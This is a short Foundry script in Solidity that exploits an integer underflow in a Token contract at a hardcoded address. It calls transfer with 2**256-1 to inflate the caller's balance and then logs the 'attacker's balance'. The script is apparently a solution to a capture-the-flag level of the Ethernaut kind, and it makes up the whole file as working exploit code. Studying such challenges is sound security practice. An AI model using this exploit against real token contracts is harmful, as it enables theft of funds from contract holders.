// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.6.0;
pragma experimental ABIEncoderV2;

import "forge-std/Script.sol";
import "../src/Token.sol";

contract TokenScript is Script {
    
    Token instance =  Token(0x338E77c85C6e817956ed8f80c14132EB8100C887);
    function run() external {
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        // overflow attack on transfer
        instance.transfer(msg.sender, 2**256 - 1);
        // print attacker's balance
        console.log("Attacker's balance: ", instance.balanceOf(msg.sender));
        vm.stopBroadcast();
    }
}
